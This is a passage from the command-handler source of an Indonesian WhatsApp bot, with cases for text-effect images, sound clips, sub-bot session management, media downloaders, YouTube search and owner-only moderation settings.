                                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                        body: proto.Message.InteractiveMessage.Body.create({
                                            text: "Ilustrasi Dari Anda inginkan"
                                        }),
                                        footer: proto.Message.InteractiveMessage.Footer.create({
                                            text: "5 Image -"
                                        }),
                                        header: proto.Message.InteractiveMessage.Header.create({
                                            hasMediaAttachment: false
                                        }),
                                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                            cards: [
                                                ...push
                                            ]
                                        })
                                    })
                                }
                            }
                        }, {});

                        zuu.relayMessage(m.chat, bot.message, {
                            messageId: bot.key.id
                        });

                    } catch (error) {
                        console.log(error)
                    }
                }
                sendPinterestImages(text, m);
            }
            break
            case "dev":
            case 'owner':
            case 'creator': {
                zuu.sendMessage(m.chat, {
                    contacts: {
                        displayName: `${list.length} Kontak`,
                        contacts: list
                    },
                    contextInfo: {
                        forwardingScore: 9999999,
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idsaluran,
                            serverMessageId: null,
                            newsletterName: global.namesaluran
                        },
                    }
                }, {
                    quoted: fsaluran
                })
            }
            break
            case "sad1":
            case "sad2":
            case "sad3":
            case "sad4":
            case "sad5":
            case "sad6":
            case "sad7":
            case "sad8":
            case "sad9":
            case "sad10":
            case "sad11":
            case "sad12":
            case "sad13":
            case "sad14":
            case "sad15":
            case "sad16":
            case "sad17":
            case "sad18":
            case "sad19":
            case "sad20":
            case "sad21":
            case "sad22":
            case "sad23":
            case "sad24":
            case "sad25":
            case "sad26":
            case "sad27":
            case "sad28":
            case "sad29":
            case "sad30":
            case "sad31":
            case "sad32":
            case "sad33":
            case "sad34":
            case "sad35": {
                let soundsad
                soundsad = command
                if (["sad1", "sad2", "sad3"].includes(command)) {
                    soundsad = "sad4"
                }
                const moai0 = await getBuffer(
                    `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${soundsad}.mp3`
                );
                zuu.sendMessage(
                    m.chat, {
                        audio: moai0,
                        mimetype: "audio/mp4",
                        ptt: true,
                    }, {
                        quoted: fsaluran
                    }
                );
            }
            break
            case 'glitchtext':
            case 'writetext':
            case 'advancedglow':
            case 'typographytext':
            case 'pixelglitch':
            case 'neonglitch':
            case 'flagtext':
            case 'flag3dtext':
            case 'deletingtext':
            case 'blackpinkstyle':
            case 'glowingtext':
            case 'underwatertext':
            case 'logomaker':
            case 'cartoonstyle':
            case 'papercutstyle':
            case 'watercolortext':
            case 'effectclouds':
            case 'blackpinklogo':
            case 'gradienttext':
            case 'summerbeach':
            case 'luxurygold':
            case 'multicoloredneon':
            case 'sandsummer':
            case 'galaxywallpaper':
            case '1917style':
            case 'makingneon':
            case 'royaltext':
            case 'freecreate':
            case 'galaxystyle':
            case 'lighteffects': {

                if (!text) return reply(`Example : ${prefix+command} ${global.botname}`)
                reply(mess.wait)
                let link
                if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
                if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
                if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
                if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
                if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
                if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
                if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
                if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
                if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
                if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
                if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
                if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
                if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
                if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
                if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
                if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
                if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
                if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
                if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
                if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
                if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
                if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
                if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
                if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
                if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
                if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
                if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
                if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
                if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
                if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
                let haldwhd = await ephoto(link, text)
                zuu.sendMessage(m.chat, {
                    image: {
                        url: haldwhd
                    },
                    caption: `Done`
                }, {
                    quoted: fsaluran
                })
            }
            break
            case 'shadow':
            case 'write':
            case 'romantic':
            case 'burnpaper':
            case 'smoke':
            case 'narutobanner':
            case 'love':
            case 'undergrass':
            case 'doublelove':
            case 'coffecup':
            case 'underwaterocean':
            case 'smokyneon':
            case 'starstext':
            case 'rainboweffect':
            case 'balloontext':
            case 'metalliceffect':
            case 'embroiderytext':
            case 'flamingtext':
            case 'stonetext':
            case 'writeart':
            case 'summertext':
            case 'wolfmetaltext':
            case 'nature3dtext':
            case 'rosestext':
            case 'naturetypography':
            case 'quotesunder':
            case 'shinetext': {
                if (!text) return reply(`Example : ${prefix + command} ${global.botname}`);
                reply(mess.wait)
                let link;
                if (/stonetext/.test(command))
                    link =
                    'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
                if (/writeart/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
                if (/summertext/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
                if (/wolfmetaltext/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
                if (/nature3dtext/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
                if (/rosestext/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
                if (/naturetypography/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
                if (/quotesunder/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
                if (/shinetext/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
                if (/shadow/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
                if (/write/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
                if (/romantic/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
                if (/burnpaper/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
                if (/smoke/.test(command))
                    link =
                    'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
                if (/narutobanner/.test(command))
                    link =
                    'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
                if (/love/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
                if (/undergrass/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
                if (/doublelove/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html';
                if (/coffecup/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
                if (/underwaterocean/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
                if (/smokyneon/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
                if (/starstext/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
                if (/rainboweffect/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
                if (/balloontext/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
                if (/metalliceffect/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
                if (/embroiderytext/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
                if (/flamingtext/.test(command))
                    link =
                    'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
                let dehe = await photoOxy(link, text);
                zuu.sendMessage(
                    m.chat, {
                        image: {
                            url: dehe
                        },
                        caption: `Done`
                    }, {
                        quoted: fsaluran
                    }
                );
            }
            break;
            case 'sound1':
            case 'sound2':
            case 'sound3':
            case 'sound4':
            case 'sound5':
            case 'sound6':
            case 'sound7':
            case 'sound8':
            case 'sound9':
            case 'sound10':
            case 'sound11':
            case 'sound12':
            case 'sound13':
            case 'sound14':
            case 'sound15':
            case 'sound16':
            case 'sound17':
            case 'sound18':
            case 'sound19':
            case 'sound20':
            case 'sound21':
            case 'sound22':
            case 'sound23':
            case 'sound24':
            case 'sound25':
            case 'sound26':
            case 'sound27':
            case 'sound28':
            case 'sound29':
            case 'sound30':
            case 'sound31':
            case 'sound32':
            case 'sound33':
            case 'sound34':
            case 'sound35':
            case 'sound36':
            case 'sound37':
            case 'sound38':
            case 'sound39':
            case 'sound40':
            case 'sound41':
            case 'sound42':
            case 'sound43':
            case 'sound44':
            case 'sound45':
            case 'sound46':
            case 'sound47':
            case 'sound48':
            case 'sound49':
            case 'sound50':
            case 'sound51':
            case 'sound52':
            case 'sound53':
            case 'sound54':
            case 'sound55':
            case 'sound56':
            case 'sound57':
            case 'sound58':
            case 'sound59':
            case 'sound60':
            case 'sound61':
            case 'sound62':
            case 'sound63':
            case 'sound64':
            case 'sound65':
            case 'sound66':
            case 'sound67':
            case 'sound68':
            case 'sound69':
            case 'sound70':
            case 'sound71':
            case 'sound72':
            case 'sound73':
            case 'sound74':
            case 'sound75':
            case 'sound76':
            case 'sound77':
            case 'sound78':
            case 'sound79':
            case 'sound80':
            case 'sound81':
            case 'sound82':
            case 'sound83':
            case 'sound84':
            case 'sound85':
            case 'sound86':
            case 'sound87':
            case 'sound88':
            case 'sound89':
            case 'sound90':
            case 'sound91':
            case 'sound92':
            case 'sound93':
            case 'sound94':
            case 'sound95':
            case 'sound96':
            case 'sound97':
            case 'Sound98':
            case 'sound99':
            case 'sound100':
            case 'sound101':
            case 'sound102':
            case 'sound103':
            case 'sound104':
            case 'sound105':
            case 'sound106':
            case 'sound107':
            case 'sound108':
            case 'sound109':
            case 'sound110':
            case 'sound111':
            case 'sound112':
            case 'sound113':
            case 'sound114':
            case 'sound115':
            case 'sound116':
            case 'sound117':
            case 'sound118':
            case 'sound119':
            case 'sound120':
            case 'sound121':
            case 'sound122':
            case 'sound123':
            case 'sound124':
            case 'sound125':
            case 'sound126':
            case 'sound127':
            case 'sound128':
            case 'sound129':
            case 'sound130':
            case 'sound131':
            case 'sound132':
            case 'sound133':
            case 'sound134':
            case 'sound135':
            case 'sound136':
            case 'sound137':
            case 'sound138':
            case 'sound139':
            case 'sound140':
            case 'sound141':
            case 'sound142':
            case 'sound143':
            case 'sound144':
            case 'sound145':
            case 'sound146':
            case 'sound147':
            case 'sound148':
            case 'sound149':
            case 'sound150':
            case 'sound151':
            case 'sound152':
            case 'sound153':
            case 'sound154':
            case 'sound155':
            case 'sound156':
            case 'sound157':
            case 'sound158':
            case 'sound159':
            case 'sound160':
            case 'sound161':
                var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
                zuu.sendMessage(m.chat, {
                    audio: resttt,
                    mimetype: 'audio/mp4',
                    ptt: true,
                })
                break
                //=============[ SYSTEM - DEBUG ]=================//
            case 'totalfeature':
            case 'totalfitur':
            case 'totalcmd':
            case 'totalcommand':
                reply(`Case : ${totalfitur}`)
                break
            case "ilovezuu":
                if (!text) return reply("xixixixii")
                
                const buggga = () => {
                    reactmess("💜")
                    zuu.sendPoll(m.chat, "*`[ MEYAKINKAN PILIHAN FITUR ]`*", [`menu`, `${text}`])
                }
                if (m.quoted) return buggga()
                try {
                    zuu.appenTextMessage("." + text, m);
                } catch (e) {
                    buggga()
                }
                
                break
                //=============[ JADIBOT - FITUR ]=================//
            case 'getses-jadibot':
                if (!isJadibot) return reply(mess.jadibot)
                
                reply(mess.wait)
                let sessionbot = await fs.readFileSync(`./lib/jadibot/session/${m.sender.replace("@s.whatsapp.net", "")}/creds.json`)
                zuu.sendMessage(m.chat, {
                    document: sessionbot,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: fsaluran
                })
                break
            case 'repses-jadibot':
            
                const folderPath4 = `./lib/jadibot/session/${m.sender.replace("@s.whatsapp.net", "")}`;

                if (!fs.existsSync(folderPath4)) {
                    return reply('*Tidak ada yang harus di perbaiki*');
                }

                try {
                    fs.rmSync(folderPath4, {
                        recursive: true,
                        force: true
                    });
                    reply('*Session telah di perbaiki, sedang me restart bot...*.');
                } catch (error) {
                    reply('Error :', error);
                }
                break
            case 'stop-jadibot':
                if (!isJadibot) return reply(mess.jadibot)
                
                const folderPath8 = `./lib/jadibot/session/${m.sender.replace("@s.whatsapp.net", "")}`;

                if (!fs.existsSync(folderPath8)) {
                    return reply('*Kamu Belum Jadibot.*');
                }

                try {
                    fs.rmSync(folderPath8, {
                        recursive: true,
                        force: true
                    });
                    reply('*Session telah dihapus, silahkan logout.*');
                } catch (error) {
                    reply('Error :', error);
                }
                break
            case 'list-jadibot':
                if (!isJadibot) return reply(mess.jadibot)
                
                try {
                    let user = [...new Set([...global.conns.filter(kiyoo => kiyoo.user).map(kiyoo => kiyoo.user)])]
                    te = "*-- List Jadibot --*\n\n"
                    for (let i of user) {
                        y = await zuu.decodeJid(i.id)
                        te += " •• User : @" + y.split("@")[0] + "\n"
                        te += " •• Name : " + i.name + "\n\n"
                    }
                    zuu.sendMessage(m.chat, {
                        text: te,
                        mentions: [y],
                    }, {
                        quoted: fsaluran
                    })
                } catch (err) {
                    reply(`NONE!`)
                }
                break
            case "renew-jadibot":
                if (!isJadibot) return reply(mess.jadibot)
                
                if (!text) {
                return zuu.sendMessage(m.chat, {
                    document: fs.readFileSync("./package.json"),
                    fileName: global.filename,
                    fileLength: 99999999999999,
                    mimetype: 'image/png',
                    jpegThumbnail: fs.readFileSync("./assets/Gallery/doc4.jpg"),
                    caption: "*[1] UNTUK RENEW*\n*[2] UNTUK BACKUP SESSION DAN BERHENTI JADIBOT*",
                    buttons: [
                    {
                        buttonId: `.renew-jadibot renew`,
                        buttonText: {
                            displayText: '[1]'
                        }
                    }, 
                     {
                    buttonId: `.renew-jadibot bu`,
                    buttonText: {
                    displayText: '[2]'
                      }
                    }, 
                    ],
                    headerType: 1,
                    viewOnce: true
                }, {
                    quoted: fsaluran,
                    ephemeralExpiration: 86400
                });
                }
                if (text === "renew") {
                givesessionBackup(m.sender)
                } else {
                givesessionBackup(m.sender, "no")
                }
                break
            case "start-jadibot":
                if (!isJadibot) return reply(mess.jadibot)
                
                const folderPath = `./lib/jadibot/session/${m.sender.replace("@s.whatsapp.net", "")}`;
                try {
                    let user = [...new Set([...global.conns.filter(kiyoo => kiyoo.user).map(kiyoo => kiyoo.user)])]
                    await jadibot(zuu, m.sender.replace("@s.whatsapp.net", ""), m, m.sender)
                } catch (err) {
                    console.log(`Belum Ada User Yang Jadibot`)
                }
                break
            case "jadibot":
                zuu.sendPoll(m.chat, "*`[ Pilih Methode ]`*", [`jadibot-scan`, `jadibot-pairing ${m.sender.replace("@s.whatsapp.net", "")}`])
                break
            case "jadibot-scan":
                if (!isPremium) return reply(mess.premium)
                userdb.jadibot = true
                const isBoter = m.sender === botNumber ? (m.isGroup ? reply(mess.private) : m.chat) : null;
                
                if (isBoter !== null) {}
                await jadibot(zuu, m.sender.replace("@s.whatsapp.net", ""), m, m.sender, "scan")
                break
            case "jadibot-test":
            console.log(waiter)
            break
            case "jadibot-pairing":
                if (!text) {
                await jadibot(zuu, m.sender.replace("@s.whatsapp.net", ""), m, m.sender, "pairing")
                } else {
                const cleanerk = text.replace(/[-+ ]/g, '')
                await jadibot(zuu, cleanerk, m, cleanerk+"@s.whatsapp.net", "pairing")
                }
                break
            case "expire-jadibot":
            if (!isJadibot) return reply(mess.jadibot)
                replyjdb(m.sender)
                break
            case "timeplus-jadibot":
                if (!isJadibot) return reply(mess.jadibot)
                if (!text) return reply("Tolong masukan nomor, atau masukan ME untuk diri sendiri, di akhir tesk adalah jam, ini penambah waktu perjam: timeplus-jadibot 628312xxxx 2d")
                let bawwng;
                bawwng = args[0]
                if (args[0] == "ME") {
                    bawwng = m.sender
                }
                if (m.sender && bawwng === botNumber) return;
                addTimeJadibot(bawwng, args[1])
                break
                //=============[ DOWNLOADER ]=================//  
            case 'fb':
            case 'facebook':
            case 'facebookvid': {
                if (!args[0]) {
                    return reply(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibkotid=Nii9`)
                }
                const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
                if (!urlRegex.test(args[0])) {
                    return reply('Url invalid')
                }
                try {
                    const result = await fg.fbdl(args[0]);
                    const tex = `
        *[ FACEBOOK DL ]*
    Title: ${result.title}`;
                    const response = await fetch(result.videoUrl)
                    const arrayBuffer = await response.arrayBuffer()
                    const videoBuffer = Buffer.from(arrayBuffer)
                    zuu.sendMessage(m.chat, {
                        video: videoBuffer,
                        caption: tex
                    }, {
                        quoted: fsaluran
                    })
                } catch (error) {
                    reply('Maybe private video!')
                }
            }
            break
            case 'git':
            case 'gitclone':
            case 'downgit':
                if (!args[0]) return reply(`Link Nya Mana Kak?\nContoh :\n${prefix}${command} Link Github`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {
                    method: 'HEAD'
                })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                zuu.sendMessage(m.chat, {
                    document: {
                        url: url
                    },
                    fileName: filename + '.zip',
                    mimetype: 'application/zip'
                }, {
                    quoted: fsaluran
                }).catch((err) => (err))
                break

            case 'twitter':
            case 'twitterdl':
            case 'twitterdl': {
                if (!args[0]) return reply(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
                if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply('Link Invalid!')
                try {
                    let {
                        SD,
                        HD,
                        desc,
                        thumb,
                        audio
                    } = await fg.twitter(args[0])
                    let te = ` 
┌─⊷ *TWITTER DL*
•°• Description: ${desc}
└───────────`
                    zuu.sendMessage(m.chat, {
                        video: {
                            url: HD
                        },
                        caption: te
                    }, {
                        quoted: fsaluran
                    })
                } catch (e) {
                    reply(`Verify that the link is from Twitter`)
                }
            }
            break
            case 'gdrive': {
                if (!args[0]) return reply(`Enter the Google Drive link`)
                try {
                    dellimit(1)
                    let res = await fg.GDriveDl(args[0])
                    reply(`*GDrive DL*

•° *Nama:* ${res.fileName}
 • *Size:* ${res.fileSize}
•° *Type:* ${res.mimetype}`)
                    setTimeout(() => {
                        zuu.sendMessage(m.chat, {
                            document: {
                                url: res.downloadUrl
                            },
                            fileName: res.fileName,
                            mimetype: res.mimetype
                        }, {})
                    }, 1000)
                } catch {
                    reply('Error: Check link or try another link')
                }
            }
            break
            case "mediafire":
            case "mf": {
                if (args.length == 0) return reply(`Dimana linknya?`)
                try {                
                   const baby1 = await mediafire(text)
                    if (baby1[0].size.split('MB')[0] >= 10000) return reply('Berat sekali...')
                    dellimit(1)
                    zuu.sendMessage(m.chat, {
                        document: {
                            url: baby1[0].link
                        },
                        fileName: baby1[0].nama,
                        mimetype: baby1[0].mime
                    }, {
                        quoted: fsaluran
                    })
                } catch {
                    reply("Kasi link yang bener dong")
                }
            }
            break
            case 'ytmp3':
            case 'youtubemp3': {
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=QfPtFMhjsi6Tccajwi7ow`
                return downloadyt(text, "mp3")
            }
            break
            case 'ytmp4':
            case 'youtubemp4': {
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                return downloadyt(text, "mp4")
            }
            break
            //=============[ SEARCHER ]=================//
            case "youtubsearch":
            case "yts":
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let searchh = await yts(text)
                dellimit(1)
                let teks = '*YouTube Search*\n\n Result From ' + text + '\n\n'
                let no = 1
                for (let i of searchh.all) {
                    teks += `•° No : ${no++}\n•° Type : ${i.type}\n•° Video ID : ${i.videoId}\n•° Title : ${i.title}\n•° Views : ${i.views}\n•° Duration : ${i.timestamp}\n•° Upload At : ${i.ago}\n•° Url : ${i.url}\n\n─────────────────\n\n`
                }
                zuu.sendMessage(m.chat, {
                    image: {
                        url: searchh.all[0].thumbnail
                    },
                    caption: teks
                }, {
                    quoted: fsaluran
                })
                break
case "ytplay":
case "play":
case 'ytmp3': {
    if (!text) return reply('Masukkan judul lagu yang ingin dicari!');

    try {
        await zuu.sendMessage(m.chat, {
            react: { text: "🧐", key: m.key }
        });

        let url = `https://api.vreden.my.id/api/ytplaymp3?query=${encodeURIComponent(text)}`;
        let response = await fetch(url);
        let json = await response.json();

        if (!json || json.status !== 200 || !json.result.status) {
            await zuu.sendMessage(m.chat, {
                react: { text: "😔", key: m.key }
            });
            return reply(' Lagu tidak ditemukan atau gagal diunduh!');
        }

        let result = {
            title: json.result.metadata.title,
            author: json.result.metadata.author.name,
            duration: json.result.metadata.timestamp,
            views: json.result.metadata.views,
            link: json.result.metadata.url,
            thumb: json.result.metadata.thumbnail,
            audio: json.result.download.url
        };

        let caption = `*ʏᴏᴜᴛᴜʙᴇ ᴍᴘ𝟹 ᴘʟᴀʏ*\n\n`;
        caption += `*ᴊᴜᴅᴜʟ:* ${result.title}\n`;
        caption += `*ᴀʀᴛɪs:* ${result.author}\n`;
        caption += `*ᴅᴜʀᴀsɪ:* ${result.duration}\n`;
        caption += `*ᴠɪᴇᴡs:* ${result.views}\n`;
        caption += `*ʟɪɴᴋ:* [YouTube](${result.link})\n\n`;
        caption += `> TUNGGU SEBENTAR LAGI NGIRIM MUSIK`;
        await zuu.sendMessage(m.chat, {
            react: { text: "😋", key: m.key }
        });

        // Pengiriman gambar dengan contextInfo
        await zuu.sendMessage(m.chat, {
            image: { url: result.thumb },
            caption,
            contextInfo: {
                mentionedJid: [m.sender],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: global.ids,
                    serverMessageId: null,
                    newsletterName: global.nems
                },
                externalAdReply: {
                    title: global.title,
                    body: timeday,
                    thumbnailUrl: thumurl,
                    sourceUrl: global.sourceurl,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: fsaluran });

        // Pengiriman audio dengan contextInfo
        await zuu.sendMessage(m.chat, {
            audio: { url: result.audio },
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: {
                mentionedJid: [m.sender],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: global.ids,
                    serverMessageId: null,
                    newsletterName: global.nems
                },
                externalAdReply: {
                    title: global.title,
                    body: timeday,
                    thumbnailUrl: thumurl2,
                    sourceUrl: global.sourceurl,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: fsaluran });
    
    } catch (error) {
        console.error(' Error:', error);
        return reply(' Terjadi kesalahan saat mengambil data lagu.');
    }
}
break;
            //=============[ OWNER - COMMAND ]=================//
            case 'onlygroup':
            case 'onlygc':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Contoh: ${prefix + command} on/off`)
                if (q == 'on') {
                    settingdb.onlygc = true
                    reply(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    settingdb.onlygc = false
                    reply(`Successfully Changed Onlygroup To ${q}`)
                }
                break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Contoh: ${prefix + command} on/off`)
                if (q == 'on') {
                    settingdb.onlypc = true
                    reply(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    settingdb.onlypc = false
                    reply(`Successfully Changed Only-Pc To ${q}`)
                }
                break
            case 'mutegc':
                if (!isCreator) return reply(mess.owner)
                if (text === "on") {
                    chatdb.mute = true
                    reply(mess.done)
                } else if (text === "off") {
                    chatdb.mute = false
                    reply(mess.done)
                } else {
                    reply("on / off")
                }
                break
            case 'setpp-panjang': {
                if (!isCreator) return reply(mess.owner)
                const jimp_1 = require('jimp')
                async function pepe(media) {
                    const jimp = await jimp_1.read(media)
                    const min = jimp.getWidth()
                    const max = jimp.getHeight()
                    const cropped = jimp.crop(0, 0, min, max)
                    return {
                        img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
                        preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
                    }
                }
                let q = m.quoted ? m.quoted : m
                let mime = (q.msg || q).mimetype || q.mediaType || ''
                if (/image/g.test(mime) && !/webp/g.test(mime)) {
                    try {
                        const media = await zuu.downloadAndSaveMediaMessage(quoted)
                        let {
                            img
                        } = await pepe(media)
                        await zuu.query({
                            tag: 'iq',
                            attrs: {
                                to: botNumber,
                                type: 'set',
                                xmlns: 'w:profile:picture'
                            },
                            content: [{
                                tag: 'picture',
                                attrs: {
                                    type: 'image'
                                },
                                content: img
                            }]
                        })
                        reply(`Sukses mengganti PP Bot`)
                    } catch (e) {
                        console.log(e)
                        reply(`Terjadi kesalahan, coba lagi nanti.`)
                    }
                } else {
                    reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
                }
            }
            break
            case 'join':
                if (!isCreator) return reply(mess.owner)
                if (!text) return reply('Enter Group Link!')
                reply(mess.wait)
                let resultpew = args[0].split('https://chat.whatsapp.com/')[1]
                await zuu.groupAcceptInvite(resultpew).then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'leave':
                if (!isCreator) return reply(mess.owner)
                if (isGroup) {
                    reply('*`[ OblivionX ] Bye Everyone`*')
                    await zuu.groupLeave(m.chat)
                } else {
                    if (!text) return reply("`[ OblivionX ] masukan id group`")
                    reply('*`[ OblivionX ] Bye Everyone`*', text)
                    await zuu.groupLeave(text)
                    reply(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return reply(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await zuu.updateBlockStatus(blockw, 'block').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'unblock':
                if (!isCreator) return reply(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await zuu.updateBlockStatus(blockww, 'unblock').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'banned': {
                if (!isCreator) return reply(mess.owner)
                if (isJadibot) return reply("*ONLY FOR REAL OWNER*")
                if (!args[0]) return reply(`*Contoh : ${command} add 6281214281312*`)
                if (args[1]) {
                    orgnye = args[1] + "@s.whatsapp.net"
                } else if (m.quoted) {
                    orgnye = m.quoted.sender
                }
                const isBane = banned.includes(orgnye)
                if (args[0] === "add") {
                    if (isBane) return reply('*Pengguna Ini telah Di Ban*')
                    banned.push(orgnye)
                    reply(`Succes ban Pengguna Ini`)
                } else if (args[0] === "del") {
